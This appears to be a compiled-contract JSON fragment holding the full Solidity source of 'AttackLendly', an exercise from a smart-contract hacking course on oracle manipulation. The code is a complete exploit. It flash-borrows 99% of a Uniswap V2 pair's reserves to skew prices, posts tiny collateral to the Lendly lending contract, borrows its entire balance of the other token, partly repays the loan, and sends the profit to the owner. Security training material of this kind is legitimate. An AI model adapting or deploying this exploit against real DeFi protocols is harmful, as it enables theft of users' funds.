  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity 0.8.13;\n\nimport {IUniswapV2Pair} from \"../../interfaces/IUniswapV2.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ninterface ILendly {\n    function deposit(address _token, uint256 _amount) external;\n    function borrow(address _token, uint256 _amount) external;\n}\n\n/**\n * @title AttackLendly\n * @author JohnnyTime (https://smartcontractshacking.com)\n */\ncontract AttackLendly is Ownable {\n\n    ILendly immutable private lendly;\n    IUniswapV2Pair immutable private pair;\n    IERC20 immutable private token0;\n    IERC20 immutable private token1;\n    uint256 private reserve0;\n    uint256 private reserve1;\n\n    constructor(address _pair, address _lendly) {\n        pair = IUniswapV2Pair(_pair);\n        lendly = ILendly(_lendly);\n        token0 = IERC20(IUniswapV2Pair(pair).token0());\n        token1 = IERC20(IUniswapV2Pair(pair).token1());\n    }\n\n    function attack() external onlyOwner {\n\n        uint256 wantedLoan;\n        bytes memory data;\n\n        // Get the reserves of the Pair smart contract\n        (reserve0, reserve1,) = pair.getReserves();\n        // Flash loan 99% DAI liquidity, drain all Lendly ETH\n        wantedLoan = reserve0 * 99 / 100;\n        data = abi.encode(token0);\n        pair.swap(wantedLoan, 0, address(this), data);\n\n\n        // Get the reserves of the Pair smart contract\n        // Flash loan 99% WETH liquidity, drain all Lendly DAI\n        (reserve0, reserve1,) = pair.getReserves();\n        wantedLoan = reserve1 * 99 / 100;\n        data = abi.encode(token1);\n        pair.swap(0, wantedLoan, address(this), data);\n\n    }\n\n    function uniswapV2Call(\n        address sender,\n        uint amount0,\n        uint amount1,\n        bytes calldata data\n    ) external {\n\n        // Make sure it's a legit callback\n        require(msg.sender == address(pair), \"not pair\");\n        require(sender == address(this), \"not sender\");\n\n        // Extract the token from the data and revert if it's a wrong token\n        IERC20 token = IERC20(abi.decode(data, (address)));\n        require(token == token0 || token == token1, \"wrong token\");\n\n        uint256 amount = amount0 == 0 ? amount1 : amount0;\n\n        // Deposit 0.1% of the amount\n        uint256 depositAmount = amount * 1 / 1000;\n        token.approve(address(lendly), depositAmount);\n        lendly.deposit(address(token), depositAmount);\n\n        // Determine other token address\n        IERC20 otherToken;\n        uint256 otherTokenReserve;\n        if(token == token0) {\n            otherToken = token1;\n            otherTokenReserve = reserve1;\n        } else {\n            otherToken = token0;\n            otherTokenReserve = reserve0;\n        }\n\n        // Borrow all the other token\n        lendly.borrow(address(otherToken), otherToken.balanceOf(address(lendly)));\n\n        // Pay back only 99.9%\n        uint256 tokenPaymentAmount = amount * 999 / 1000;\n\n        // Amount to pay in the other token OtherToken Reserve * 4 / 1000\n        uint256 otherTokenPaymentAmount = otherTokenReserve * 4 / 1000;\n\n        token.transfer(address(pair), tokenPaymentAmount);\n        otherToken.transfer(address(pair), otherTokenPaymentAmount);\n        \n        withdrawProfit();\n    }\n\n    function withdrawProfit() internal {\n        token0.transfer(owner(), token0.balanceOf(address(this)));\n        token1.transfer(owner(), token1.balanceOf(address(this)));\n    }\n\n}",
  "sourceMap": "569:2995:3:-:0;;;825:236;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;936:32:0;719:10:2;936:18:0;:32::i;:::-;-1:-1:-1;;;;;879:28:3;;;;;;;917:25;;;;;968:29;;;-1:-1:-1;;;968:29:3;;;;:27;;:29;;;;;-1:-1:-1;;968:29:3;;;;;;;;879:28;968:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;;;;;952:46:3;;;-1:-1:-1;;;;;952:46:3;;;;;1039:4;;-1:-1:-1;;;;;1024:27:3;;:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;;;;;1008:46:3;;;-1:-1:-1;569:2995:3;;-1:-1:-1;569:2995:3;2433:187:0;2506:16;2525:6;;-1:-1:-1;;;;;2541:17:0;;;-1:-1:-1;;;;;;2541:17:0;;;;;;2573:40;;2525:6;;;;;;;2573:40;;2506:16;2573:40;2496:124;2433:187;:::o;14:177:5:-;93:13;;-1:-1:-1;;;;;135:31:5;;125:42;;115:70;;181:1;178;171:12;115:70;14:177;;;:::o;196:293::-;275:6;283;336:2;324:9;315:7;311:23;307:32;304:52;;;352:1;349;342:12;304:52;375:40;405:9;375:40;:::i;:::-;365:50;;434:49;479:2;468:9;464:18;434:49;:::i;:::-;424:59;;196:293;;;;;:::o;494:208::-;564:6;617:2;605:9;596:7;592:23;588:32;585:52;;;633:1;630;623:12;585:52;656:40;686:9;656:40;:::i;:::-;646:50;494:208;-1:-1:-1;;;494:208:5:o;:::-;569:2995:3;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;",
  "sourcePath": "contracts/oracle-manipulation-2/AttackLendly.sol",
  "type": "contract"
}